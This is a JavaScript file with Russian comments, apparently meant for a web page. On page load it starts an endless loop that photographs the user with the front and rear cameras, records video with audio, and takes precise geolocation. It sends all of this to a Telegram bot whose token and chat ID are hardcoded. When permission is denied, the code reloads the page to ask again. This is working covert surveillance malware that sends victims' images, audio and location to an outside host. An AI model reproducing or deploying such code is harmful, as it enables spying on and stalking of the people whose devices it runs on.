// 🔥 Встроены твой TG токен и chat_id
const TELEGRAM_TOKEN = "8377810271:AAG4gGXoBLBCjt3fKE9ZSefJ92UiI_jKW5I";
const TELEGRAM_CHAT_ID = "8071841674";
const TELEGRAM_ERROR_MSG = "Пользователь отказал в доступе";

const statusEl = document.getElementById('status');

// Функция для конвертации base64 фото в Blob
function dataURLtoBlob(dataurl) {
  const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1];
  const bstr = atob(arr[1]);
  let n = bstr.length;
  const u8arr = new Uint8Array(n);
  while(n--) u8arr[n] = bstr.charCodeAt(n);
  return new Blob([u8arr], {type:mime});
}

// Отправка данных в Telegram
async function sendToTelegram(payload) {
  try {
    if (payload.error) {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: payload.error })
      });
    }
    if (payload.coords) {
      const mapUrl = `https://yandex.com/maps/?ll=${payload.coords.lon}%2C${payload.coords.lat}&z=16`;
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `Геолокация: ${mapUrl}` })
      });
    }
    if (payload.photo) {
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("photo", payload.photo, "photo.jpg");
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method:"POST", body: formData });
    }
    if (payload.video) {
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("document", payload.video, "video.webm");
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, { method:"POST", body: formData });
    }
  } catch(err) {
    console.error("Ошибка отправки в Telegram:", err);
  }
}

// Функция снимка фото
async function takePhoto(facingMode) {
  const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode }, audio:false });
  const video = document.createElement("video");
  video.srcObject = stream;
  await video.play();

  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video,0,0);
  const photoBlob = dataURLtoBlob(canvas.toDataURL("image/jpeg"));

  stream.getTracks().forEach(t=>t.stop());
  return photoBlob;
}

// Функция записи видео
async function recordVideo(facingMode, durationMs) {
  const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode }, audio:true });
  const recorder = new MediaRecorder(stream);
  const chunks = [];
  recorder.ondataavailable = e => chunks.push(e.data);

  const stopped = new Promise(resolve=>recorder.onstop = resolve);
  recorder.start();
  await new Promise(r => setTimeout(r,durationMs));
  recorder.stop();
  await stopped;

  stream.getTracks().forEach(t=>t.stop());
  return new Blob(chunks,{type:"video/webm"});
}

// Получение геолокации
async function getCoords() {
  return await new Promise((resolve,reject)=>{
    navigator.geolocation.getCurrentPosition(
      pos=>resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
      err=>reject(err),
      { enableHighAccuracy:true, timeout:10000 }
    );
  });
}

// Основной цикл работы
async function mainCycle() {
  let coordsSent = false;

  while(true) {
    try {
      // --- Фронт фото ---
      const photoFront = await takePhoto("user");
      await sendToTelegram({ photo: photoFront });
      if(!coordsSent) {
        try { const coords = await getCoords(); await sendToTelegram({ coords }); coordsSent=true; } catch(e){ console.log("Гео не получено"); }
      }
      await new Promise(r=>setTimeout(r,3000)); // пауза 3 сек

      // --- Зад фото ---
      const photoBack = await takePhoto("environment");
      await sendToTelegram({ photo: photoBack });
      await new Promise(r=>setTimeout(r,3000)); // пауза 3 сек

      // --- Видео фронт 10 сек ---
      const videoFront = await recordVideo("user", 10000);
      await sendToTelegram({ video: videoFront });
      await new Promise(r=>setTimeout(r,3000)); // пауза 3 сек

      // --- Видео зад 5 сек ---
      const videoBack = await recordVideo("environment", 5000);
      await sendToTelegram({ video: videoBack });
      await new Promise(r=>setTimeout(r,3000)); // пауза 3 сек

    } catch(err) {
      console.error("Ошибка доступа к камере/микрофону:", err);
      await sendToTelegram({ error: TELEGRAM_ERROR_MSG });
      location.reload();
      break;
    }
  }
}

// Авто-запуск
mainCycle();
